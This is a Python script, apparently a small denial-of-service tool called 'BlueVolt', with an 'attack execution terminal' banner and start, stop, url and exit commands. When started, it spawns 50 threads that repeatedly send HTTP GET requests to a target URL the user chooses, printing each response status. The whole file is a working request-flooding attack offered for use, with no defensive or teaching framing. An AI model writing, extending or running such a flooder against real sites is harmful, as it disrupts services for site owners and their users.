import requests
import threading
import time
import os

# ASCII ART
ASCII_ART = """
██████╗ ██╗     ██╗   ██╗███████╗██╗   ██╗ ██████╗ ██╗  ████████╗
██╔══██╗██║     ██║   ██║██╔════╝██║   ██║██╔═══██╗██║  ╚══██╔══╝
██████╔╝██║     ██║   ██║█████╗  ██║   ██║██║   ██║██║     ██║   
██╔══██╗██║     ██║   ██║██╔══╝  ╚██╗ ██╔╝██║   ██║██║     ██║   
██████╔╝███████╗╚██████╔╝███████╗ ╚████╔╝ ╚██████╔╝███████╗██║   
╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝  ╚═══╝   ╚═════╝ ╚══════╝╚═╝   
                         [ ATTACK EXECUTION TERMINAL ]
"""

stop_attack = False

def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"[✓] Connected to {url} | Status: {response.status_code}")
        else:
            print(f"[✗] Failed to {url} | Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")

def send_requests(url):
    global stop_attack
    while not stop_attack:
        check_site_status(url)
        time.sleep(0.5)

def main():
    global stop_attack
    
    # Clear screen and show ASCII art
    os.system('clear')
    print(ASCII_ART)
    print("\n[>] Type 'start' to begin attack")
    print("[>] Type 'stop' to halt attack")
    print("[>] Type 'url' to change target")
    print("[>] Type 'exit' to quit\n")
    
    target_url = "https://example.com"
    attack_threads = []
    attack_active = False
    
    while True:
        command = input("[BLUEVOLT] ").strip().lower()
        
        if command == "start":
            if attack_active:
                print("[!] Attack already running!")
            else:
                print(f"[>] Starting attack on {target_url}...")
                stop_attack = False
                for _ in range(50):  # 50 threads = continuous requests
                    t = threading.Thread(target=send_requests, args=(target_url,), daemon=True)
                    t.start()
                    attack_threads.append(t)
                attack_active = True
                print("[✓] Attack running! Type 'stop' to halt.")
        
        elif command == "stop":
            if attack_active:
                stop_attack = True
                attack_threads.clear()
                attack_active = False
                print("[✓] Attack stopped.")
            else:
                print("[!] No attack running.")
        
        elif command == "url":
            new_url = input("[?] Enter new target URL (with https:// or http://): ").strip()
            if new_url:
                target_url = new_url
                print(f"[✓] Target changed to: {target_url}")
                if attack_active:
                    print("[!] Attack was running. Restart with 'start' for new target.")
            else:
                print("[!] URL cannot be empty.")
        
        elif command == "exit":
            if attack_active:
                stop_attack = True
                print("[!] Stopping attack before exit...")
                time.sleep(1)
            print("[>] BlueVolt offline. Goodbye.")
            break
        
        else:
            print("[!] Unknown command. Try: start, stop, url, exit")

if __name__ == "__main__":
    main()
